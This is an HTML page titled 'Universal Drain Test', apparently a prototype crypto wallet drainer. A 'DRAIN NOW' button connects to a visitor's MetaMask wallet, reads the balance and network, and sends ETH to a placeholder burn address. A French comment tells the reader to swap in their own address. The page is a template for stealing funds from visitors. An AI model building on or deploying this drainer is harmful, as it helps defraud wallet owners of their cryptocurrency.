<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Universal Drain Test</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    button {
      padding: 14px 30px;
      background-color: #0088ff;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <button onclick="connectAndSend()">üöÄ DRAIN NOW</button>

  <script>
    async function connectAndSend() {
      if (!window.ethereum) {
        alert("MetaMask n'est pas d√©tect√©. Ouvre ce site dans Mozilla avec MetaMask.");
        return;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);

      const signer = provider.getSigner();
      const userAddress = await signer.getAddress();
      console.log("Connect√© √† :", userAddress);

      // Lire le r√©seau actif (Ethereum, BSC, Polygon, etc.)
      const network = await provider.getNetwork();
      console.log("R√©seau:", network.name, "Chain ID:", network.chainId);

      // Lire le solde de l'utilisateur
      const balance = await provider.getBalance(userAddress);
      const balanceInEth = ethers.utils.formatEther(balance);
      console.log("Solde ETH:", balanceInEth);

      // V√©rifier qu'on a un minimum de 0.001 ETH pour le test
      const minRequired = ethers.utils.parseEther("0.001");

      if (balance.lt(minRequired)) {
        alert("Solde insuffisant. Tu as seulement " + balanceInEth + " ETH.");
        return;
      }

      // Pr√©parer la transaction
      const tx = {
        to: "0x000000000000000000000000000000000000dEaD", // ‚Üê remplace par ton adresse
        value: ethers.utils.parseEther("0.001")         // ‚Üê montant √† envoyer
      };

      try {
        const result = await signer.sendTransaction(tx);
        console.log("Transaction envoy√©e:", result.hash);
        alert("‚úÖ Transaction envoy√©e avec succ√®s:\n" + result.hash);
      } catch (err) {
        console.error("Erreur:", err);
        alert("‚ùå Transaction annul√©e ou erreur.");
      }
    }
  </script>
</body>
</html>
